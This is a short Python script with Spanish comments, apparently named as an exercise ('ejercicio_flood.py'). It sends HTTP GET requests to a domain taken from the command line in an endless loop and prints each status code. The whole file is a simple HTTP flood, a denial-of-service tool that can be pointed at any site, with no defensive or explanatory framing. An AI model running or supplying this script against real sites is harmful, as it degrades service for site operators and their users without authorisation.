#no me importa bien el requests
import requests
import sys

def flood_http(domain):
    try:
        while True:
            response = requests.get(domain)
            print(f"Petición enviada a {domain}, estado: {response.status_code}")
    except KeyboardInterrupt:
        print("\nDetenido por el usuario.")
    except requests.exceptions.RequestException as e:
        print(f"Ocurrió un error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python ejercicio_flood.py <DOMINIO>")
        sys.exit(1)

    domain = sys.argv[1]
    flood_http(domain)
